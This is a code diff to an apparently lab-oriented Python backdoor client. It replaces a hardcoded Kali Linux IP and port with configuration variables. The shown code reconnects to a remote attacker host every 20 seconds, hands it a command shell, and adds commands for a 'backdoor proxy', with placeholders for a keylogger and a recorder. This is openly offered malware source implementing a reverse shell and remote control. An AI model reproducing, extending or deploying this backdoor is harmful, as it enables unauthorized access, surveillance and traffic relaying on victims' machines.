@@ -10,6 +10,9 @@ import subprocess  # For running shell commands
 import json  # For encoding and decoding data in JSON format
 import os  # For interacting with the operating system
 
+# Import configuration variables
+from configuration import SERVER_IP, SERVER_PORT, PROXY_PORT
+
 # Import enhanced features
 keylogger = None
 recorder = None  
@@ -53,8 +56,8 @@ def connection():
     while True:
         time.sleep(20)  # Wait for 20 seconds before reconnecting (for resilience)
         try:
-            # Connect to a remote host - CHANGE THIS IP TO YOUR KALI LINUX IP
-            s.connect(('192.168.56.104', 5555))  # Update this to your Kali IP
+            # Connect to a remote host using configuration variables
+            s.connect((SERVER_IP, SERVER_PORT))  # Use configured IP and port
             # Once connected, enter the shell() function for command execution
             shell()
             # Close the connection when done
@@ -272,7 +275,7 @@ def shell():
         elif command == 'start_proxy':
             try:
                 if proxy_manager is None:
-                    proxy_manager = create_backdoor_proxy('192.168.56.104', 5555)
+                    proxy_manager = create_backdoor_proxy(SERVER_IP, PROXY_PORT)
                 success, msg = proxy_manager.start_proxy_operations()
                 reliable_send("proxy: " + msg)
             except Exception as e:
@@ -291,7 +294,7 @@ def shell():
         elif command == 'proxy_status':
             try:
                 if proxy_manager is None:
-                    proxy_manager = create_backdoor_proxy('192.168.56.104', 5555)
+                    proxy_manager = create_backdoor_proxy(SERVER_IP, PROXY_PORT)
                 status = proxy_manager.get_proxy_status()
                 reliable_send("proxy Status: " + json.dumps(status, indent=2))
             except Exception as e:
@@ -300,7 +303,7 @@ def shell():
         elif command == 'test_proxy':
             try:
                 if proxy_manager is None:
-                    proxy_manager = create_backdoor_proxy('192.168.56.104', 5555)
+                    proxy_manager = create_backdoor_proxy(SERVER_IP, PROXY_PORT)
                 
                 # Enhanced test with more details
                 if proxy_manager.channel and proxy_manager.channel.is_running:
